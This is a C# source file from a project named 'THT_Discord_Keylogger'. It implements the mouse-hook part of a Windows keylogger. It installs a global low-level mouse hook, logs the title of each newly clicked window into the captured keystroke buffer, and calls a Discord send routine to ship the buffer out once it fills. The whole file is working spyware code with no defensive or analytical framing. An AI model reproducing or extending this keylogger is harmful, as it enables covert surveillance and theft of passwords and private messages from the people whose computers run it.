using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger
{
    class MouseHook
    {
        public static HookProc MouseHookGCRootedDelegate;
        public static string last_active_win = "";
        public static IntPtr mouse_hook_process(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || wParam != (IntPtr)WindowsMessages.WM_LBUTTONUP)
            {
                return DLLImports.CallNextHookEx(mouse_hook, nCode, wParam, lParam);
            }

            string active_win = Utils.get_active_window_title() == null ? "Unknown"
                : Utils.get_active_window_title();
      
            if (active_win == "Unknown" || active_win == MouseHook.last_active_win)
                return DLLImports.CallNextHookEx(mouse_hook, nCode, wParam, lParam);

            last_active_win = active_win;
            active_win = ("[Pencerede:" + active_win + "]").ToUpperInvariant().Replace("ı", "I").Replace("I", "İ") + "\\n";

            if (!(KeyboardHook.key_buffer.Length < Settings.buffer_threshold) ||
                !((KeyboardHook.key_buffer.Length + active_win.Length) < Settings.buffer_threshold))
            {
                Program.discord.send();
                KeyboardHook.key_buffer = "";
                KeyboardHook.key_count = 0;
            }

            KeyboardHook.key_buffer += active_win;

            return DLLImports.CallNextHookEx(mouse_hook, nCode, wParam, lParam);
        }

        public static IntPtr mouse_hook = IntPtr.Zero;
        public static void setup_hook()
        {
            IntPtr instance = DLLImports.LoadLibrary("user32.dll");
            if (instance == IntPtr.Zero)
            {
                return;
            }

            MouseHookGCRootedDelegate = mouse_hook_process;
            mouse_hook = DLLImports.SetWindowsHookEx(HookType.WH_MOUSE_LL, MouseHookGCRootedDelegate, instance, 0);
        }
    }
}
